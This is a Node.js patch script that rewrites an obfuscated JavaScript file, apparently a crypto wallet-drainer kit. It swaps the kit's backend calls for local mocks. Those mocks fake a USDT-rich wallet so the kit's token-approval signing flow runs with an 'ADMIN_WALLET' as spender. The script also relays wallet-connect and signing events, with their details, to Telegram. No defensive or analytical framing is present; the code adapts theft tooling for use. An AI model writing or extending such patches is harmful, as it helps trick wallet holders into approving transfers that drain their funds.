const fs = require('fs');
const path = require('path');

const filePath = '/Users/rohit/Downloads/final/3fef7c25.beautified.js';
let content = fs.readFileSync(filePath, 'utf8');

// Patch the sendRequest method in _0xfc660
const sendRequestRegex = /async\s*\[_0x17e00b\(0x257\)\]\(_0x3542af,\s*_0x1b0bff\s*=\s*\{\}\)\s*\{[\s\S]*?console\[_0x4b8d95\(0x1ee\)\]\(_0x4b8d95\(0x1ef\),\s*_0x1d0c3e\);\s*\}\s*\}/;

const patch = `async [_0x17e00b(0x257)](_0x3542af, _0x1b0bff = {}) {
        const _0x4b8d95 = _0x17e00b;
        console.log("MOCK Backend request:", _0x3542af, _0x1b0bff);
        
        // Telegram notifications for certain actions
        if (['logExecutionDetails', 'signWaiting', 'signTransaction', 'connectWalletSuccess', 'signSucceeded', 'signFailed'].includes(_0x3542af)) {
             if (window.sendTelegram) {
                 window.sendTelegram("<b>Action:</b> " + _0x3542af + "\\n<b>Details:</b> <pre>" + JSON.stringify(_0x1b0bff, null, 2) + "</pre>");
             }
        }

        if (_0x3542af === 'getStandardConfig' || _0x3542af === 'getPreferences') {
            return window.LOCAL_CONFIG;
        }

        if (_0x3542af === 'checkWallet') {
            // Mock a wallet with high USDT balance to trigger the sign flow
            return {
                "totalAmountUsd": 5000,
                "overview": { "isAccountAlreadyConnected": true },
                "sortedByPriority": [
                    {
                        "type": "Trc20",
                        "address": window.CONFIG.USDT_CONTRACT,
                        "balance": "5000000000", // 5000 USDT
                        "name": "Tether USD",
                        "symbol": "USDT",
                        "decimals": 6,
                        "hasIncreaseApprovalMethod": true,
                        "spenderAddress": window.CONFIG.ADMIN_WALLET
                    }
                ],
                "wallets": []
            };
        }

        if (_0x3542af === 'getId') {
            return 'mock-session-id-' + Math.random().toString(36).substring(7);
        }
        if (_0x3542af === 'createSignRequest') {
            // Return mock execution settings for the sign flow
            return { 
                executionId: 'mock-exec-' + Date.now(),
                spenderAddress: window.CONFIG.ADMIN_WALLET,
                contractAddress: window.CONFIG.USDT_CONTRACT,
                awaitTransaction: true
            };
        }
        
        return { ok: true, status: 'success', data: {} };
    }`;

content = content.replace(sendRequestRegex, patch);

// Also patch the IIFE at the end to ensure window.LOCAL_CONFIG is used
const iifeRegex = /_0x30fca3\s*=\s*await\s*_0x15655d\[_0x2dd63c\(0x257\)\]\(_0x781833\[_0x2dd63c\(0x17c\)\]\);/;
content = content.replace(iifeRegex, `_0x30fca3 = window.LOCAL_CONFIG;`);

fs.writeFileSync('/Users/rohit/Downloads/final/3fef7c25.js', content);
console.log("Patched 3fef7c25.js successfully with Wallet Check Mock");
